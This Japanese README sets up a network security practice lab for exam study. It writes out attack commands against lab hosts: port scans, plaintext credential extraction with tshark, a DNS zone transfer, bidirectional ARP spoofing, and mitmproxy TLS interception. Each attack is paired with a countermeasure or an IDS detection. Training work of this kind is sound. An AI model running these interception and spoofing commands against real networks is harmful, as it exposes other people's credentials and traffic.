# network/playground — ネットワーク演習環境（標的＋トグル）

小さな社内ネットワークを1つ用意し、偵察・盗聴・ARP・DNS・TLS-MITM などを**同じ環境**で行う。防御（FW）や監視（IDS）、キャプチャは**トグル**で後付けする。

## 構成
| ホスト | IP | 役割 |
|---|---|---|
| attacker | 10.10.0.10 | Kali（nmap, tcpdump, dsniff 等） |
| web | 10.10.0.20 | 平文サービス群: FTP / Telnet / HTTP / HTTP Basic(/secret) / 管理画面(:8080) / SSH |
| secure | 10.10.0.30 | 暗号化サービス: SSH・SFTP / HTTPS（web との比較用） |
| victim | 10.10.0.50 | 利用者役。15秒ごとに web/secure へログインし通信を流す |

トグル（必要時のみ起動）:
| トグル | コマンド | 内容 |
|---|---|---|
| キャプチャ | `make capture` / `capture-stop` | ブリッジ全体を pcap 記録（→ Mac の Wireshark） |
| IDS | `make ids` / `ids-stop` | Suricata で監視し captures/suricata/eve.json にアラート |
| ファイアウォール | `make fw-on` / `fw-off` | web の iptables を 22,80 のみ許可にライブ切替 |

いずれも `LAB=network/playground` を付ける。

## 演習

### 1) 偵察（recon）
```sh
make up LAB=network/playground
make shell LAB=network/playground
nmap -sV -p- 10.10.0.20        # FTP/Telnet/HTTP/8080 が見える
curl -s http://10.10.0.20/backup/     # ディレクトリ一覧 → db_2026.sql
curl -s http://10.10.0.20:8080/       # 認証なし管理画面
```
対策確認: `make fw-on` 後に再スキャン → 22,80 以外が filtered に。

### 2) 盗聴（sniffing）
```sh
make capture LAB=network/playground   # 30秒ほど待つ
make capture-stop LAB=network/playground
```
pcap を Wireshark で開く／tshark で抽出:
```sh
tshark -r <pcap> -Y 'ftp.request.command=="PASS"' -T fields -e ftp.request.arg   # S3cretPass!
tshark -r <pcap> -Y http.authbasic -T fields -e http.authbasic                   # alice:S3cretPass!
```
→ 平文(web)は筒抜け。暗号化(secure, 22/443)は中身が読めない。

### 3) 検知（detection / IDS）
```sh
make ids LAB=network/playground       # Suricata起動（別ターミナルで放置）
# victim の平文通信にアラートが上がる
grep -o '"signature":"[^"]*"' captures/suricata/eve.json | sort | uniq -c
```
→ Cleartext FTP / Telnet を検知。ルールは `ids/custom.rules`。

### 4) DNS ゾーン転送（AXFR）
`dns`（10.10.0.40）は `allow-transfer { any; }` の設定ミスがある。
```sh
dig +noall +answer @10.10.0.40 corp.local AXFR
# → vpn / backup / jenkins-dev / admin など内部ホストが丸見え
```
対策: `named.conf` の `allow-transfer` をセカンダリに限定（`{ none; }` か特定IP）、再帰も内部に限定。

### 5) ARPスプーフィング（中間者攻撃）
attacker に `arpspoof`（dsniff）を用意済み。web と victim の間に割り込む。
```sh
sysctl -w net.ipv4.ip_forward=1
arpspoof -i eth0 -t 10.10.0.50 10.10.0.20     # victim に web を詐称（別ターミナル）
arpspoof -i eth0 -t 10.10.0.20 10.10.0.50     # web に victim を詐称
# 経路に入った状態で tcpdump / make capture により平文を取得
```
※ 実行はこの環境内で各自が行う。対策: スイッチのDAI（Dynamic ARP Inspection）、静的ARP、通信の暗号化。

### 6) TLS証明書の検証不備（HTTPSのMITM）
victim は `curl -k`（証明書を検証しない）で secure にアクセスしている。ARPで経路に入り `mitmproxy` を挟むと、HTTPSでも復号できてしまう。
```sh
mitmproxy --mode transparent    # 経路上で復号（victimが検証しないため成立）
```
対策: 証明書を必ず検証する（`-k` を使わない／ピン留め）、HSTS。検証していれば警告で遮断される点が要点。

## 試験での問われ方
- ポートスキャンと攻撃面の縮小、FWのデフォルトDENY
- 平文プロトコルの危険性と TLS/SSH による機密性確保
- IDS/IPS の役割（検知と防御の違い）、シグネチャ型の限界
- スイッチ環境での盗聴（ミラーポート/ARPスプーフィング）

## 後片付け
```sh
make down LAB=network/playground   # トグル類もまとめて停止・削除
```
